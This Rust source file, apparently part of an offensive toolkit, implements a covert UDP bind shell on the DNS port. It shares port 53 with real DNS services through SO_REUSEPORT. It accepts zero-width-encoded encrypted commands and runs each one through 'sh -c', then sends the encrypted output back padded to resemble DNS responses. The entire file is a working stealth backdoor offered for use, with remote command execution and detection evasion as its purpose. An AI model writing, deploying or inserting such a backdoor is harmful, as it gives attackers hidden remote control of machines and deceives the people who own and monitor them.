//! UDP/53 (DNS-port) ZW-encrypted covert bind shell.
//!
//! Listens on UDP port 53 with SO_REUSEPORT — coexists with real DNS servers.
//! Commands are ZW-encoded in UDP datagrams. Responses look like DNS responses
//! to casual inspection but contain ZW-encoded encrypted payloads.

use std::net::SocketAddr;
use tokio::net::UdpSocket;
use tracing::{debug, error, info};

/// Start a ZW-encrypted UDP bind shell on port 53 (or any port).
///
/// SO_REUSEPORT allows coexistence with real DNS services.
pub async fn spawn_udp_shell(
    addr: SocketAddr,
    session_key: [u8; 32],
) -> std::io::Result<()> {
    let std_sock = crate::udp_reuse_socket(&addr)?;
    let socket = UdpSocket::from_std(std_sock)?;
    info!("UDP ZW bind shell listening on {} (SO_REUSEPORT)", addr);

    let mut buf = vec![0u8; 4096];
    loop {
        let (n, peer) = match socket.recv_from(&mut buf).await {
            Ok(result) => result,
            Err(e) => {
                error!("UDP recv error: {e}");
                continue;
            }
        };

        let data = String::from_utf8_lossy(&buf[..n]).to_string();
        debug!("UDP ZW datagram from {}: {} bytes", peer, n);

        let mut session = arcticfox_zwtransport::ZwSession::new(session_key);

        if let Ok(plaintext) = session.open(&data) {
            let cmd = String::from_utf8_lossy(&plaintext).to_string();
            debug!("UDP ZW command: {}", cmd);

            let output = {
                let result = std::process::Command::new("sh")
                    .arg("-c")
                    .arg(&cmd)
                    .output();
                match result {
                    Ok(out) => {
                        format!(
                            "{}{}",
                            String::from_utf8_lossy(&out.stdout),
                            String::from_utf8_lossy(&out.stderr)
                        )
                    }
                    Err(e) => format!("[error: {}]", e),
                }
            };

            if let Ok(frame) = session.seal(output.as_bytes()) {
                let resp = frame.as_bytes();
                // Pad small responses to look like DNS (minimum 64 bytes)
                let padded = if resp.len() < 64 {
                    let mut p = resp.to_vec();
                    p.resize(64, 0);
                    p
                } else {
                    resp.to_vec()
                };
                socket.send_to(&padded, peer).await?;
            }
        }
    }
}
